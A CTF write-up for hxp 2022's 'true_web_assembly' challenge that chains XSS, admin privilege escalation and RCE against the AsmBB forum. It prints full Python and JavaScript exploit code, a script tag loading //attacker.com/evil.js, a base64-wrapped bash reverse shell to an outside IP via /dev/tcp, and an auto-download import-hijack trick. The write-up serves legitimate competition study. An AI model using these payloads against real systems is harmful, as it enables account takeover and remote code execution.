---
title: 'hxp ctf 2022 (2023): true_web_assembly'
date: 2023-03-13 21:53:05
tags: [CTF]
---

### Challenge description

> https://board.asm32.info/asmbb-v2-9-has-been-released.328/
>
> From the post:
>
> - “AsmBB is very secure web application, because of the internal design and the reduced dependencies. But it also supports encrypted databases, for even higher security.”
> - “Download, install and hack”
>
> Yes
>
> ------
>
> Goal is to get the admin to visit a page on the forum,
>   HACK-HACK-HACK,
>     /readflag will print out the flag.
>
> ------
>
> Please don’t submit too many requests or try to abuse anything with the setup.
>
> Focus on the forum’s implementation.

The engine of http handler is written in pure ASM.

The admin bot would visit a given page.


### Solution

Attack approach:

- XSS to get administrator privileges
- set server settings
    - `Pipe the email thourgh`, this filed controls how the server engine send a email
    - `Confirm by email`, this option enables sending emails when changing password, changing email, and registering new user.
- change email -> send email -> smtp_exec -> rce

#### XSS

Create a new thread and prepare the xss payload (like `<script>alert(1)</script>`) in the thread title.

Post a lot of contents (like `'a'*0x100000`) to the content of the new thread and submit it.

The XSS alert will pop out when viewing the edit page.

The key question is how is this found? In fact, one of our pwner found it by fuzzing :) 

This step may be the most difficult part.

#### RCE

XSS can only bring us administrator privileges. But what we finally need is RCE.

Since the server engine is written in ASM purelly. The possible approach to RCE is to call `execve` syscall.

Search relevant code snippets and we can find following asm code in `command.asm`.

```asm
    stdcall FileClose, edx
    stdcall Exec2, [.exec], ebx, [STDOUT], [STDERR]
    stdcall WaitProcessExit, eax, -1
```

Along with such a clue we can find a call trace in `command.asm`.

```plain{lineNos = false}
-> ProcessActivationEmails
-> SendActivationEmail
-> Exec2
```

Search `ProcessActivationEmails` in all source files and obtain three callers:

- `RegisterNewUser`
- `ResetPassword`
- `ChangeEmail`

And they all checks the parameter `email_confirm`, which can be set with administrator privileges.

```asm
        stdcall GetParam, "email_confirm", gpInteger
        jc      .send_emails
```

Going back to the `Exec2` we can notice that the args of `Exec2` is stored in variable  `.exec`, which is assigned with the parameter `smtp_exec`.

```asm
        stdcall GetParam, txt "smtp_exec", gpString
        mov     [.exec], eax
        test    eax, eax
        jnz     .addresses_ok
```

There are several approach to set parameters since we already obtain admin privileges:

- execute sql statements and update the sqlite database directly.
- post forms in settings page.



### Exp

Note that:

- all http requests should bring the auth header.
- all post requests should be submited with a ticket which is hidden in forms.

First we should prepare some essential enviroment:

```python
import requests
import base64
from bs4 import BeautifulSoup

ip = '162.55.216.146'
port = '24366'
host = '%s:%s' % (ip, port)

proxy_username = 'hxp'
proxy_password = 'hxp'
basic_auth = base64.b64encode((f'{proxy_username}:{proxy_password}').encode()).decode()

sess = requests.Session()
```

register a new user

```python
def register(username, password):
    url = 'http://' + host + '/!register/'
    headers = { 'Authorization': f'Basic {basic_auth}' }
    r = requests.get(url, headers=headers)
    html = BeautifulSoup(r.text, features='html5lib')
    ticket = html.find('input', {'name':'ticket'})['value']
    data = {
        'username': username,
        'email': '',
        'password': password,
        'password2': password,
        'ticket': ticket,
        'submit.x': '10082',
        'submit.y': '11'
    }
    r = requests.post(url, data=data, headers=headers, allow_redirects=True)
    html = BeautifulSoup(r.text, features='html5lib')
    msg = html.find('div', {'class':'message'}).text
    print(msg)
```

login

```python
def login(username, password):
    url = 'http://' + host + '/!login/'
    headers = { 'Authorization': f'Basic {basic_auth}' }
    r = sess.get(url, headers=headers)
    html = BeautifulSoup(r.text, features='html5lib')
    ticket = html.find('input', {'name':'ticket'})['value']
    data = {
        'username': username,
        'password': password,
        'backlink': '/',
        'ticket':  ticket,
        'submit.x': '10083',
        'submit.y': '2'
    }
    r = sess.post(url, data=data, headers=headers, allow_redirects=False)
```

post a new thread and get the edit page path to trigger XSS

```python
def post_thread(title, content):
    url = 'http://' + host + '/!post/'
    headers = { 'Authorization': f'Basic {basic_auth}' }
    r = sess.get(url, headers=headers)
    html = BeautifulSoup(r.text, features='html5lib')
    ticket = html.find('input', {'name':'ticket'})['value']
    data = {
        'ticket': ticket,
        'submit': '',
        'tabselector': '',
        'title': title,
        'tags': '',
        'invited': '',
        'format': '',
        'source': content,
    }
    files = { 'attach': '' }
    r = sess.post(url, data=data, files=files, headers=headers, allow_redirects=False)
    path = r.headers['Location'].replace('#', '') + '/!edit'
    return path
```

execute sql statements

```python
def exec_sql(sql):
    url = 'http://' + host + '/!sqlite/'
    headers = { 'Authorization': f'Basic {basic_auth}' }
    r = sess.get(url, headers=headers)
    html = BeautifulSoup(r.text, features='html5lib')
    ticket = html.find('input', {'name':'ticket'})['value']
    data = { 'source': sql, 'ticket': ticket }
    r = sess.post(url, data=data, headers=headers)
```

change email

```python
def change_email(username, password):
    url = 'http://' + host + '/!userinfo/' + username
    headers = { 'Authorization': f'Basic {basic_auth}' }
    r = sess.get(url, headers=headers)
    html = BeautifulSoup(r.text, features='html5lib')
    ticket = html.find('input', {'name':'ticket'})['value']
    url = 'http://' + host + '/!changemail'
    data = {
        'password': password,
        'email': 'abcd@qq.com',
        'ticket': ticket,
        'changeemail': 'Change email',
    }
    r = sess.post(url, data=data, headers=headers, allow_redirects=False)
    print(r.headers)
```

interactive with the admin bot

```python
def access_bot(path:str):
    from pwn import remote, context
    io = remote(ip, 9762)
    io.sendlineafter(b'Please give instance username: ', proxy_username.encode())
    io.sendlineafter(b'Please give instance password: ', proxy_password.encode())
    io.sendlineafter(b'Please give instance port: ', port.encode())
    io.recvuntil(b'Please give the path the admin should check. (should match ^.{0,100}$)\n')
    io.recvuntil(f'http://{host}/')
    io.sendline(path.encode())
    io.recvuntil(b'Done visiting')
    io.close()
```

Then exploite happily~

```python
username = 'test'
password = 'test123'

register(username, password)
login(username, password)
path = post_thread(f'<script src="//attacker.com/evil.js"></script>', 'a' * 0x100000)
access_bot(path.removeprefix('/'))
cmd = '/usr/bin/bash -c "/usr/bin/bash -i >& /dev/tcp/11.45.14.01/2333 0>&1"'
payload = base64.b64encode(cmd.encode()).decode()
smtp_exec = f'/usr/bin/python3 -c __import__("os").popen(__import__("base64").b64decode(b"{payload}").decode());'
sql = f'''
update params set val=1 where id='email_confirm';
insert into params values('smtp_exec', '/readflag');
update params set val='{smtp_exec}' where id='smtp_exec';
'''
exec_sql(sql)
change_email(username, password)
```

The content of `evil.js`:

```javascript
const host = 'http://162.55.216.146:24366'
const proxy_username = 'hxp';
const proxy_password = 'hxp';
const username = 'test'

let is_admin = 1;
let user_perm = is_admin ? "$80000000" : "0"
let auth = btoa(proxy_username + ':' + proxy_password)

fetch(host + '/!userinfo/' + username, {
    credentials: 'include',
    headers: { 'Authorization': 'Basic ' + auth }
}).then(res => res.text())
.then(res => {
        let data = res;
        data = data.match('<input type="hidden" name="ticket" value="([0-9A-F]{32})">')[1];
        fetch(host + '/!userinfo/' + username, {
            method: 'POST',
            credentials: 'include',
            headers: { 'Authorization': 'Basic ' + auth },
            body: new URLSearchParams([
                ['user_desc', ''],
                ['user_perm', '1'],
                ['user_perm', '2'],
                ['user_perm', '4'],
                ['user_perm', '8'],
                ['user_perm', '16'],
                ['user_perm', '64'],
                ['user_perm', '256'],
                ['user_perm', '512'],
                ['user_perm', '1024'],
                ['user_perm', user_perm],
                ['PostInterval', '0'],
                ['PostIntervalInc', '0'],
                ['MaxPostLen', '0'],
                ['ticket', data],
                ['save', 'Save']
            ])
        });
    }
);
```


### An Unintended Solution

The admin bot hasn't turned off the "auto download" option of chrome, so we can upload an attachment file and pass the link path to the bot and it would download the file automatically and save the file in `/home/admin`.

if we name the attachment file as `re.py`, the next time `admin.py` is executed, our script will be imported and executed :)

